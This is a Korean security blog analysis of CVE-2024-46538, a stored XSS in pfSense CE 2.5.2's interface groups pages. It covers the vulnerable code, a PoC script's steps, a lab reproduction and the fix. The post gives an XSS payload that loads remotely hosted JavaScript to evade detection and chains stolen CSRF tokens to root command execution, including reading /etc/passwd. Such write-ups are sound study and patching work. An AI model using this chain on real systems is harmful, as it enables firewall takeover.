[SEED 8월호] CVE-2024-46538: pfSense Interface Groups 저장형 XSS 취약점

author: bage2room Posted on 2026-08-28 In S.E.E.D. series

1. CVE 설명

pfSense는 FreeBSD의 무료 오픈소스 방화벽 및 라우터 소프트웨어로, 웹 기반 인터페이스를 통해 구성 및 관리된다. 개인뿐만 아니라 기업에서도 무료로 사용할 수 있는 이점을 가지고 있어 많은 사용자들이 네트워크 구성에 활용하고 있다.

CVE-2024-46538 은 인터페이스 그룹 관리 메뉴의 입력값 검증 미흡으로 임의의 악성 스크립트를 삽입할 수 있기 때문에 발생한다. 공격자는 XSS 취약점을 통해 운영자의 CSRF Token을 탈취할 수 있고, 이를 이용해 관리자 콘솔을 통한 임의 명령 실행까지 유도한다. 관리자 콘솔을 통한 임의 명령 실행으로 악성코드를 설치하면 방화벽 장악 및 규칙 조작 등이 가능하기 때문에 지속적인 공격을 가할 수 있다.

대상 pfSense CE
핵심 조건 인터페이스 그룹 편집 권한(WebCfg - Interfaces: Groups: Edit) 계정 보유, 관리자의 인터페이스 그룹 페이지 접근
영향 CSRF 토큰 탈취, 원격 코드 실행
CVSS 4.8 Medium (NVD CVSS v3.1)
취약 버전 pfSense CE 2.5.2
패치 버전 v2.6.0, v2.7.0, 2.7.2 및 최신 v2.8.1(2026.08.07 기준)



2. 공격 시나리오

CVE-2024-46538의 전반적인 공격 흐름은 다음과 같다. Interfaces: Groups: Edit 권한을 가진 계정이 저장한 악성 스크립트가 관리자 세션에서 실행되면서, 단순 XSS가 관리자 권한 탈취 및 root 권한 명령 실행으로 연계된다.

① 공격자는 pfSense를 방화벽으로 사용 중인 취약한 서버를 탐색하고 저권한 계정(Interfaces: Groups: Edit 권한 보유 계정)을 확보한다.

② 인터페이스 그룹 편집 권한이 있는 계정으로 members 필드에 악성 JavaScript를 저장한다.

③ 관리자가 인터페이스 그룹 페이지(interfaces_groups.php)에 접근하면 저장된 스크립트가 관리자 브라우저에서 실행된다.

④ 스크립트가 관리자 세션의 CSRF 토큰을 탈취하고, diag_command.php에 임의 명령 실행 요청을 전송한다.

⑤ 관리자 권한으로 임의 명령이 실행되어 방화벽 내 악성코드 설치 등이 가능해진다.



3. Target 분석

  • 영향을 받는 버전(Target) : pfSense CE 2.5.2
  • 취약한 부분
    그림 1. [/usr/local/www/interfaces_groups_edit.php의 취약 코드]

취약점의 원인은 interfaces_groups_edit.php에서 사용자 입력 값인 $_POST['members'] 값을 별도의 필터링 없이 $members 변수에 저장하는 부분이다. 또한 $members 변수는 ifgroupentry 변수의 ‘members’ 키에 해당하는 값으로 저장된다. 이후 a_ifgroups에 저장된 ifgroupentry 변수의 값을 저장하고, 설정값을 config.xml 데이터로 저장하는 write_config를 실행한다.

그림 2. [/usr/local/www/interfaces_groups.php의 취약 부분]

interfaces_groups.php는 저장된 인터페이스 그룹 정보를 출력하여 나타나는 페이지이다.
①에서 config에 저장된 그룹 정보를 $a_ifgroups 에 참조 변수로 가져와 ②→③으로 members 값을 array→str 변환 후, ④에서 별도 필터링 없이 페이지에 그대로 출력한다.
interfaces_groups_edit.php 내에도 $a_ifgroups = &$config['ifgroups']['ifgroupentry']와 같이 동일한 형식으로 참조 변수가 선언되어 있다. 이로 인해 interfaces_groups_edit.php 페이지에서 악성 스크립트를 저장하면 config에 즉시 반영되며, interfaces_groups.php에서도 동일한 오염된 값이 출력되어 취약점이 발생하게 된다.

정리하면, 이 취약점은 두 지점의 문제가 결합되어 발생한다.
첫째, interfaces_groups_edit.php에서 사용자 입력값(members)을 필터링 없이 그대로 config에 저장한다.
둘째, interfaces_groups.php에서 저장된 값을 출력할 때 htmlspecialchars 등 HTML 인코딩 처리 없이 echo로 그대로 내보낸다.
즉, 스크립트를 저장·출력하는 과정에서 필터링이 되지 않기 때문에, 관리자가 페이지를 여는 순간 저장된 스크립트가 실행되는 저장형 XSS가 발생한다.


4. PoC 분석

4.1 mal.js

그림 3. [악성 JavaScript 페이로드 (mal.js)]

CVE-2024-46538.py(공격 스크립트)는 WebCfg - Interfaces: Groups: Edit 권한 계정으로 로그인한 뒤, 위 필드에 악성 JavaScript(mal.js)를 저장한다. 관리자가 이후 interfaces_groups.php를 조회하면 저장된 스크립트가 관리자 브라우저에서 실행되며, 스크립트는 diag_command.php에 CSRF 토큰과 함께 명령 실행 요청(FormData: txtCommand, submit=EXEC 등)을 보내 임의 명령을 실행하고 결과를 탈취한다.

4.2 CVE-2024-46538.py

CVE-2024-46538.py는 아래 4개의 핵심 메서드로 구성된다. 각 메서드는 순차적으로 호출되어 저장형 XSS 공격을 자동화한다.

① getJS() : 외부 서버에 악성 JavaScript 호스팅

그림 4. [외부 JavaScript 호스팅 메서드(getJS)]

api.mocky.io API 서비스를 이용해 악성 JavaScript 내용을 JSON body로 POST 요청을 보내서 외부 접근 가능한 콜백 URL을 생성한다. XSS 페이로드는 해당 URL에서 JavaScript 파일을 <script src> 방식으로 로드하기 때문에, 악성 코드가 인라인으로 삽입되지 않아 탐지를 우회할 수 있다. deleteJS() 메서드를 통해 사용 후 삭제한다.

② getCSRFToken() : CSRF 토큰 추출

그림 5. [CSRF 토큰 추출 메서드(getCSRFToken)]

pfSense 페이지에서 정규식으로 “__csrf_magic” 숨김 필드를 추출한다. pfSense의 모든 POST 요청에는 CSRF 토큰이 포함되어야 하므로, 로그인 및 XSS 저장 요청 전 반드시 호출된다. 세션 쿠키를 선택적으로 전달하여 인증 전후 모두 사용 가능하다.

③ getSession() : 로그인 및 세션 쿠키 획득

그림 6. [세션 획득 메서드(getSession)]

CSRF 토큰과 계정 정보를 포함해 /index.php에 POST 요청으로 로그인한다. pfSense는 로그인 성공 시 302 리다이렉트와 함께 PHPSESSID 세션 쿠키를 발급하며, 이 쿠키를 이후 storeScript() 요청에 사용해 인증된 세션으로 공격을 수행한다.

④ storeScript() : XSS 페이로드 저장

그림 7. [XSS 페이로드 저장 메서드(storeScript)]

공격의 핵심 메서드이다. members[] 파라미터에 <script/src="[jsUrl]"></script>wan을 삽입한다. 스크립트 태그 뒤에 wan을 붙이는 이유는 pfSense가 members 값에서 유효한 인터페이스 이름(wan 등)이 포함되어야 저장을 허용하기 때문이다. 저장 성공 시 302 리다이렉트로 응답하며, 이후 관리자가 interfaces_groups.php에 접근하면 저장된 스크립트가 실행된다.


5. PoC 재현 결과

그림 8. [testuser 계정 생성 확인]

① 낮은 권한(WebCfg – Interfaces: Groups: Edit)을 할당한 계정 testuser를 준비한다.

② CVE-2024-46538.py를 실행하여 testuser 세션으로 interfaces_groups_edit.php의 members 파라미터에 악성 스크립트(mal.js)를 저장한다.

③ 관리자(admin) 계정으로 interfaces_groups.php 접속하면 저장된 스크립트가 실행된다.

  • 테스트 환경
    피해자 : pfSense CE v2.5.2 (192.168.150.1)
    공격자 : Kali Linux (192.168.150.10)
  • 공격 스크립트 실행

그림 9. [CVE-2024-46538.py 공격 스크립트 실행]

그림 10. [공격 스크립트 실행 결과]

스크립트 실행 결과, testuser 계정으로 정상 로그인되어 세션이 발급되고, interfaces_groups_edit.php의 members 파라미터에 mal.js를 로드하는 악성 스크립트가 저장되었다.

그림 11. [관리자 브라우저에서 id 명령 실행 결과]

관리자(admin) 계정으로 로그인 후 http://192.168.150.1/interfaces_groups.php 페이지에 접속하자, 저장되어 있던 스크립트가 관리자 브라우저 컨텍스트에서 즉시 실행되었다. 스크립트는 diag_command.php에 CSRF 토큰과 함께 명령 실행 요청을 전송했고, 그 결과가 alert 창으로 출력되었다.

그림 12. [cat /etc/passwd 명령 실행 결과]

mal.js에서 txtCommand의 값을 기존 “id”에서 “cat /etc/passwd”로 변경하여 진행해 보았다. Interfaces: Groups: Edit 권한만 가진 저권한 계정이 저장한 스크립트가 관리자 세션에서 실행되어 root 권한으로 임의 명령이 실행됨을 확인할 수 있다. 이를 통해 CVE-2024-46538이 단순 XSS에 그치지 않고, 저권한 사용자의 관리자 권한 탈취 및 시스템 전체 장악(RCE)으로 이어질 수 있는 고위험 취약점임을 실제 환경에서 검증했다.


6. Patch

그림 13. [interfaces_groups.php 취약점 패치 전/후]

interfaces_groups.php 파일에서, PHP에서 HTML 예약 문자를 안전한 엔티티로 바꾸어 XSS 공격을 막는 도구인 htmlspecialchars 함수를 통해 출력되도록 수정되었다.

그림 14. [interfaces_groups_edit.php 취약점 패치 전/후]

interfaces_groups_edit.php 파일에서, 먼저 $_POST['members']로 넘어온 각 값이 실제로 존재하는 인터페이스인지 array_key_exists로 하나씩 검사한다. 목록에 있는 인터페이스라면 $validmembers에 추가하고, 없으면 "invalid interface" 에러 처리 후 검증에 통과한 $validmembers만 저장하도록 수정되었다.
